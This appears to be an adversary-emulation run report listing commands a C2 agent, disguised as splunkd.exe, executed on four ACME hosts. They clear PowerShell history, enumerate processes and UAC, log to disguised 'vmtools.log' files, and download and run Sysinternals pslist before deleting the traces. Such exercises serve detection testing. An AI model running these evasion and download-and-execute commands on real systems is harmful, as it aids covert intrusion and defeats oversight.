
Enumeration
===========

Contents
========

* [Hosts Attacked](#hosts-attacked)
* [Links](#links)
	* [Host: ACME-HH-ZYQ](#host-acme-hh-zyq)
	* [Host: ACME-HH-EUO](#host-acme-hh-euo)
	* [Host: ACME-WS-PLU](#host-acme-ws-plu)
	* [Host: ACME-HH-ESO](#host-acme-hh-eso)
* [Steps](#steps)
	* [Host: ACME-HH-ZYQ (paw: kwmxux)](#host-acme-hh-zyq-paw-kwmxux)
		* [  Description: Capture process id, executable path, pid and parent pid before writing to disk](#--description-capture-process-id-executable-path-pid-and-parent-pid-before-writing-to-disk)
		* [  Description: Capture running processes and their loaded DLLs](#--description-capture-running-processes-and-their-loaded-dlls)
		* [  Description: Capture running processes via PowerShell](#--description-capture-running-processes-via-powershell)
		* [  Description: Determine whether or not UAC is enabled](#--description-determine-whether-or-not-uac-is-enabled)
		* [  Description: Process discovery via SysInternals pstool](#--description-process-discovery-via-sysinternals-pstool)
	* [Host: ACME-HH-EUO (paw: acpuoe)](#host-acme-hh-euo-paw-acpuoe)
		* [  Description: Capture process id, executable path, pid and parent pid before writing to disk](#--description-capture-process-id-executable-path-pid-and-parent-pid-before-writing-to-disk)
		* [  Description: Capture running processes and their loaded DLLs](#--description-capture-running-processes-and-their-loaded-dlls)
		* [  Description: Capture running processes via PowerShell](#--description-capture-running-processes-via-powershell)
		* [  Description: Determine whether or not UAC is enabled](#--description-determine-whether-or-not-uac-is-enabled)
		* [  Description: Process discovery via SysInternals pstool](#--description-process-discovery-via-sysinternals-pstool)
	* [Host: ACME-WS-PLU (paw: hkrmxr)](#host-acme-ws-plu-paw-hkrmxr)
		* [  Description: Capture process id, executable path, pid and parent pid before writing to disk](#--description-capture-process-id-executable-path-pid-and-parent-pid-before-writing-to-disk)
		* [  Description: Capture running processes and their loaded DLLs](#--description-capture-running-processes-and-their-loaded-dlls)
		* [  Description: Capture running processes via PowerShell](#--description-capture-running-processes-via-powershell)
		* [  Description: Determine whether or not UAC is enabled](#--description-determine-whether-or-not-uac-is-enabled)
		* [  Description: Process discovery via SysInternals pstool](#--description-process-discovery-via-sysinternals-pstool)
	* [Host: ACME-HH-ESO (paw: nowkww)](#host-acme-hh-eso-paw-nowkww)
		* [  Description: Capture process id, executable path, pid and parent pid before writing to disk](#--description-capture-process-id-executable-path-pid-and-parent-pid-before-writing-to-disk)
		* [  Description: Capture running processes and their loaded DLLs](#--description-capture-running-processes-and-their-loaded-dlls)
		* [  Description: Capture running processes via PowerShell](#--description-capture-running-processes-via-powershell)
		* [  Description: Determine whether or not UAC is enabled](#--description-determine-whether-or-not-uac-is-enabled)
		* [  Description: Process discovery via SysInternals pstool](#--description-process-discovery-via-sysinternals-pstool)

# Hosts Attacked

|Host|User|Beachhead Command|PID|Parent PID|IP|C2 Server|
| :---: | :---: | :---: | :---: | :---: | :---: | :---: |
|ACME-HH-ZYQ|ACME\grantj|splunkd.exe|3872|4840|172.31.45.222|http://172.31.10.226:8888|
|ACME-HH-EUO|ACME\grantj|splunkd.exe|1052|2004|172.31.41.178|http://172.31.10.226:8888|
|ACME-WS-PLU|ACME\grantj|splunkd.exe|1116|8312|172.31.11.139, 172.25.240.1|http://172.31.10.226:8888|
|ACME-HH-ESO|ACME\grantj|splunkd.exe|8376|8992|172.31.39.111|http://172.31.10.226:8888|

# Links

(what exactly is a link? seems to be a command executed when initializing the beachhead?)
## Host: ACME-HH-ZYQ


  Technique: Indicator Removal on Host: Clear Command History

  PID: 2304

  Status: Success

  Start: 2024-09-04T03:18:40Z

  Finish: 2024-09-04T03:18:40Z

  Command: 
```powershell
Clear-History;Clear
```


## Host: ACME-HH-EUO


  Technique: Indicator Removal on Host: Clear Command History

  PID: 4324

  Status: Success

  Start: 2024-09-13T17:10:22Z

  Finish: 2024-09-13T17:10:22Z

  Command: 
```powershell
Clear-History;Clear
```


## Host: ACME-WS-PLU


  Technique: Indicator Removal on Host: Clear Command History

  PID: 8504

  Status: Success

  Start: 2024-09-13T17:12:11Z

  Finish: 2024-09-13T17:12:12Z

  Command: 
```powershell
Clear-History;Clear
```


## Host: ACME-HH-ESO


  Technique: Indicator Removal on Host: Clear Command History

  PID: 10164

  Status: Success

  Start: 2024-09-13T17:15:40Z

  Finish: 2024-09-13T17:15:40Z

  Command: 
```powershell
Clear-History;Clear
```


# Steps

## Host: ACME-HH-ZYQ (paw: kwmxux)

###   Description: Capture process id, executable path, pid and parent pid before writing to disk


  Attack: {'tactic': 'collection', 'technique_name': 'WMIC', 'technique_id': 'T1047'}

  Status: Success

  PID: 3796

  Start: 2024-09-13T17:30:41Z

  Command: 
```powershell
wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log
```


###   Description: Capture running processes and their loaded DLLs


  Attack: {'tactic': 'discovery', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}

  Status: Success

  PID: 6220

  Start: 2024-09-13T17:31:23Z

  Command: 
```powershell
tasklist /m  >> $env:APPDATA\vmtool.log;cat $env:APPDATA\vmtool.log
```


###   Description: Capture running processes via PowerShell


  Attack: {'tactic': 'discovery', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}

  Status: Success

  PID: 7496

  Start: 2024-09-13T17:32:05Z

  Command: 
```powershell
get-process >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log
```


###   Description: Determine whether or not UAC is enabled


  Attack: {'tactic': 'discovery', 'technique_name': 'Software Discovery: Security Software Discovery', 'technique_id': 'T1518.001'}

  Status: Success

  PID: 6276

  Start: 2024-09-13T17:33:10Z

  Command: 
```powershell
echo $(get-uac)
```


###   Description: Process discovery via SysInternals pstool


  Attack: {'tactic': 'collection', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}

  Status: Success

  PID: 7556

  Start: 2024-09-13T17:33:48Z

  Command: 
```powershell
$ps_url = "https://download.sysinternals.com/files/PSTools.zip";$download_folder = "C:\Users\Public\";$staging_folder = "C:\Users\Public\temp";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder"PSTools.zip" -DestinationPath $staging_folder;iex $staging_folder"\pslist.exe" >> $env:LOCALAPPDATA\output.log;Remove-Item $download_folder"PSTools.zip";Remove-Item $staging_folder -Recurse
```


## Host: ACME-HH-EUO (paw: acpuoe)

###   Description: Capture process id, executable path, pid and parent pid before writing to disk


  Attack: {'tactic': 'collection', 'technique_name': 'WMIC', 'technique_id': 'T1047'}

  Status: Success

  PID: 5192

  Start: 2024-09-13T17:30:05Z

  Command: 
```powershell
wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log
```


###   Description: Capture running processes and their loaded DLLs


  Attack: {'tactic': 'discovery', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}

  Status: Success

  PID: 5976

  Start: 2024-09-13T17:31:03Z

  Command: 
```powershell
tasklist /m  >> $env:APPDATA\vmtool.log;cat $env:APPDATA\vmtool.log
```


###   Description: Capture running processes via PowerShell


  Attack: {'tactic': 'discovery', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}

  Status: Success

  PID: 4828

  Start: 2024-09-13T17:32:00Z

  Command: 
```powershell
get-process >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log
```


###   Description: Determine whether or not UAC is enabled


  Attack: {'tactic': 'discovery', 'technique_name': 'Software Discovery: Security Software Discovery', 'technique_id': 'T1518.001'}

  Status: Success

  PID: 3640

  Start: 2024-09-13T17:32:50Z

  Command: 
```powershell
echo $(get-uac)
```


###   Description: Process discovery via SysInternals pstool


  Attack: {'tactic': 'collection', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}

  Status: Success

  PID: 5460

  Start: 2024-09-13T17:33:48Z

  Command: 
```powershell
$ps_url = "https://download.sysinternals.com/files/PSTools.zip";$download_folder = "C:\Users\Public\";$staging_folder = "C:\Users\Public\temp";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder"PSTools.zip" -DestinationPath $staging_folder;iex $staging_folder"\pslist.exe" >> $env:LOCALAPPDATA\output.log;Remove-Item $download_folder"PSTools.zip";Remove-Item $staging_folder -Recurse
```


## Host: ACME-WS-PLU (paw: hkrmxr)

###   Description: Capture process id, executable path, pid and parent pid before writing to disk


  Attack: {'tactic': 'collection', 'technique_name': 'WMIC', 'technique_id': 'T1047'}

  Status: Success

  PID: 7176

  Start: 2024-09-13T17:30:48Z

  Command: 
```powershell
wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log
```


###   Description: Capture running processes and their loaded DLLs


  Attack: {'tactic': 'discovery', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}

  Status: Success

  PID: 5824

  Start: 2024-09-13T17:31:42Z

  Command: 
```powershell
tasklist /m  >> $env:APPDATA\vmtool.log;cat $env:APPDATA\vmtool.log
```


###   Description: Capture running processes via PowerShell


  Attack: {'tactic': 'discovery', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}

  Status: Success

  PID: 6840

  Start: 2024-09-13T17:32:25Z

  Command: 
```powershell
get-process >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log
```


###   Description: Determine whether or not UAC is enabled


  Attack: {'tactic': 'discovery', 'technique_name': 'Software Discovery: Security Software Discovery', 'technique_id': 'T1518.001'}

  Status: Success

  PID: 8560

  Start: 2024-09-13T17:33:15Z

  Command: 
```powershell
echo $(get-uac)
```


###   Description: Process discovery via SysInternals pstool


  Attack: {'tactic': 'collection', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}

  Status: Success

  PID: 4952

  Start: 2024-09-13T17:34:04Z

  Command: 
```powershell
$ps_url = "https://download.sysinternals.com/files/PSTools.zip";$download_folder = "C:\Users\Public\";$staging_folder = "C:\Users\Public\temp";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder"PSTools.zip" -DestinationPath $staging_folder;iex $staging_folder"\pslist.exe" >> $env:LOCALAPPDATA\output.log;Remove-Item $download_folder"PSTools.zip";Remove-Item $staging_folder -Recurse
```


## Host: ACME-HH-ESO (paw: nowkww)

###   Description: Capture process id, executable path, pid and parent pid before writing to disk


  Attack: {'tactic': 'collection', 'technique_name': 'WMIC', 'technique_id': 'T1047'}

  Status: Success

  PID: 9872

  Start: 2024-09-13T17:30:48Z

  Command: 
```powershell
wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log
```


###   Description: Capture running processes and their loaded DLLs


  Attack: {'tactic': 'discovery', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}

  Status: Success

  PID: 3004

  Start: 2024-09-13T17:31:34Z

  Command: 
```powershell
tasklist /m  >> $env:APPDATA\vmtool.log;cat $env:APPDATA\vmtool.log
```


###   Description: Capture running processes via PowerShell


  Attack: {'tactic': 'discovery', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}

  Status: Success

  PID: 6392

  Start: 2024-09-13T17:32:24Z

  Command: 
```powershell
get-process >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log
```


###   Description: Determine whether or not UAC is enabled


  Attack: {'tactic': 'discovery', 'technique_name': 'Software Discovery: Security Software Discovery', 'technique_id': 'T1518.001'}

  Status: Success

  PID: 6448

  Start: 2024-09-13T17:33:22Z

  Command: 
```powershell
echo $(get-uac)
```


###   Description: Process discovery via SysInternals pstool


  Attack: {'tactic': 'collection', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}

  Status: Success

  PID: 3484

  Start: 2024-09-13T17:34:32Z

  Command: 
```powershell
$ps_url = "https://download.sysinternals.com/files/PSTools.zip";$download_folder = "C:\Users\Public\";$staging_folder = "C:\Users\Public\temp";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder"PSTools.zip" -DestinationPath $staging_folder;iex $staging_folder"\pslist.exe" >> $env:LOCALAPPDATA\output.log;Remove-Item $download_folder"PSTools.zip";Remove-Item $staging_folder -Recurse
```

